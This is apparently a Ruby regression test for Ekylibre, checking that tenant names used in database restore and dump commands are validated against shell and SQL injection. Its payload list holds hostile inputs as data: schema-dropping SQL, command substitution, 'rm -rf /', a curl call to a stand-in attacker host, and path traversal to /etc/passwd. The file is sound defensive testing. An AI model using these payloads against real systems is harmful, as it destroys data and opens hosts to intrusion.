# frozen_string_literal: true

require 'test_helper'

module Ekylibre
  # Regression tests for the tenant restore injection.
  #
  # `Ekylibre::Tenant.restore` took the tenant name from places an attacker
  # controls — the filename uploaded to `Admin::RestoreController#create`, or
  # the `manifest.yml` shipped inside the archive — and interpolated it into a
  # SQL identifier inside a shell command piped to `psql`:
  #
  #   sh("echo '... DROP SCHEMA IF EXISTS \"#{tenant_name}\" CASCADE; ...' | psql ...")
  #
  # Nothing validated it. These tests pin the choke point that now does.
  class TenantSecurityTest < ActiveSupport::TestCase
    # Names real deployments use, that must keep working. Hyphens included:
    # `sci-chenes-verts` is in config/tenants.yml.
    VALID_NAMES = %w[ekylibre acme acme_farm sci-chenes-verts test_without_fixtures Acme2 public test t0].freeze

    # Shell and SQL payloads reaching `psql` through the restore path.
    INJECTION_PAYLOADS = [
      'foo"; DROP SCHEMA public CASCADE; --',
      "foo'; SELECT pg_sleep(10); --",
      'foo`id`',
      'foo$(id)',
      'foo; rm -rf /',
      'foo | psql',
      'foo && curl http://attacker.example',
      '../../etc/passwd',
      'foo bar',
      '',
      '-foo',
      '9foo',
      "foo\nbar",
      '__all__'
    ].freeze

    test 'validate_name! accepts bare identifiers' do
      VALID_NAMES.each do |name|
        assert_equal name, Ekylibre::Tenant.validate_name!(name), "#{name.inspect} should be accepted"
      end
    end

    test 'validate_name! rejects every shell and SQL payload' do
      INJECTION_PAYLOADS.each do |payload|
        assert_raises(Ekylibre::TenantError, "#{payload.inspect} should be rejected") do
          Ekylibre::Tenant.validate_name!(payload)
        end
      end
    end

    test 'restore refuses a malicious requested tenant name before touching anything' do
      payload = 'evil"; DROP SCHEMA public CASCADE; --'

      assert_raises(Ekylibre::TenantError) do
        Ekylibre::Tenant.restore(Rails.root.join('tmp', 'does-not-exist.zip'), tenant: payload, verbose: false)
      end
    end

    test 'restore refuses a malicious tenant name coming from the archive manifest' do
      skip 'unzip binary not available' unless system('which unzip > /dev/null 2>&1')

      payload = 'evil"; DROP SCHEMA public CASCADE; --'
      archive = build_archive(manifest: { 'tenant' => payload, 'format_version' => '3', 'database_version' => 0 })

      assert_raises(Ekylibre::TenantError) do
        Ekylibre::Tenant.restore(archive, verbose: false)
      end
    ensure
      FileUtils.rm_rf(archive.dirname) if archive
    end

    test 'restore_tables_v3 refuses to interpolate an unvalidated name into psql' do
      payload = 'evil"; DROP SCHEMA public CASCADE; --'

      assert_raises(Ekylibre::TenantError) do
        Ekylibre::Tenant.send(:restore_tables_v3, tenant_name: payload, path: Rails.root.join('tmp'), dump_file: Rails.root.join('tmp', 'x.sql'))
      end
    end

    test 'dump_tables_v3 refuses to interpolate an unvalidated name into pg_dump' do
      payload = 'evil`id`'

      assert_raises(Ekylibre::TenantError) do
        Ekylibre::Tenant.send(:dump_tables_v3, tenant_name: payload, archive_path: Rails.root.join('tmp'))
      end
    end

    private

      # @return [Pathname] a zip holding only the given manifest
      def build_archive(manifest:)
        dir = Pathname.new(Dir.mktmpdir('tenant-security-test'))
        path = dir.join('archive.zip')
        Zip::File.open(path.to_s, Zip::File::CREATE) do |zip|
          zip.get_output_stream('manifest.yml') { |io| io.write(manifest.to_yaml) }
        end
        path
      end
  end
end
